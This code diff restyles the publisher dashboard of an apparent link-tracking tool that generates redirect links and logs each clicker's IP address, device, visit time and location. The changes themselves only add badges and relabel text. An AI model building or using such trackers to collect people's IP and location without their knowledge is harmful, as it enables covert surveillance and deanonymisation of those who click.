@@ -206,7 +206,16 @@
             font-size: 12px;
             margin-right: 6px;
         }
-        /* Responsive */
+        .publisher-badge {
+            background: #9f7aea;
+            color: white;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            display: inline-block;
+            margin-left: 8px;
+        }
         @media (max-width: 768px) {
             .login-box { padding: 25px; }
             .link-input-group input { min-width: 140px; }
@@ -242,23 +251,24 @@
                 </header>
 
                 <div class="link-generator">
-                    <h3>🔗 Generate Power Link</h3>
+                    <h3>🔗 Generate Power Link <span class="publisher-badge">PUBLISHER</span></h3>
                     <div class="link-input-group">
                         <input type="url" id="publisherCustomUrl" placeholder="Enter URL to redirect" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
                         <button onclick="publisherGenerateLink()">Generate Link</button>
                     </div>
                     <div class="link-output" id="publisherLinkOutput">
-                        <p><strong>✅ Link Generated:</strong></p>
+                        <p><strong>✅ Publisher Link Generated:</strong></p>
                         <div style="display:flex; gap:8px; margin-top:8px;">
-                            <input type="text" id="publisherGeneratedLink" readonly style="flex:1; padding:8px; border:2px solid #48bb78; border-radius:5px; background:rgba(255,255,255,0.05); color:#fff; font-size:13px;">
+                            <input type="text" id="publisherGeneratedLink" readonly style="flex:1; padding:8px; border:2px solid #9f7aea; border-radius:5px; background:rgba(255,255,255,0.05); color:#fff; font-size:13px;">
                             <button onclick="copyPublisherLink()" class="copy-btn">📋 Copy</button>
                         </div>
+                        <p style="font-size:12px; color:#9f7aea; margin-top:5px;">📌 This link will only show data in this publisher dashboard</p>
                     </div>
                 </div>
 
-                <!-- Visitor History - Same as Admin -->
+                <!-- Visitor History - Only Publisher Visitors -->
                 <div class="visitors-table">
-                    <h2>📋 Visitor History</h2>
+                    <h2>📋 Publisher Visitor History <span class="publisher-badge">📢 PUBLISHER</span></h2>
                     <div id="publisherUsersList"></div>
                 </div>
             </div>
@@ -390,14 +400,14 @@
         }
 
         // ============================================
-        // DISPLAY PUBLISHER USERS (Visitor History)
+        // DISPLAY PUBLISHER USERS (Only Publisher Visitors)
         // ============================================
         function displayPublisherUsers(users) {
             const container = document.getElementById('publisherUsersList');
             container.innerHTML = '';
 
             if (!users || users.length === 0) {
-                container.innerHTML = '<div class="empty-state">No visitors yet. Generate a link to start.</div>';
+                container.innerHTML = '<div class="empty-state">No publisher visitors yet. Generate a link to start.</div>';
                 return;
             }
 
@@ -409,6 +419,7 @@
                     <div class="header">
                         <div>
                             <strong><span class="serial-number">#${index + 1}</span> ${user.id || 'N/A'}</strong>
+                            <span class="publisher-badge">📢 PUBLISHER</span>
                             <div class="info">📱 ${user.deviceName || 'Unknown'} ${user.ip ? `• 🌐 ${user.ip}` : ''}</div>
                             <div class="info">📅 ${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'Not visited yet'}</div>
                             ${locationStr ? `<div class="info">📍 ${locationStr}</div>` : ''}
